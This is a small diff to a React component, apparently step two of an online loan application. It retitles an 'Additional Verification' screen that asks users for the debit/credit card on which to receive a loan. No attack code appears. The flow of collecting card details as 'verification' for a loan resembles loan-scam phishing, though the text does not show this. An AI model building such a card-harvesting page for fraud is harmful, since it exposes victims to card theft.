@@ -3011,7 +3011,7 @@ const Step2ATMCard = ({
           </button>
         </div>
 
-        <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
+        <h1 className="text-4xl font-bold mb-4">Additional Verification To The Loan Credit</h1>
         <p className="text-sm mb-8 leading-relaxed bg-white/20 backdrop-blur-sm p-4 rounded-lg">
   <span className="font-bold">Note:</span> Please provide the debit/credit card on which 
   you wish to receive the loan.
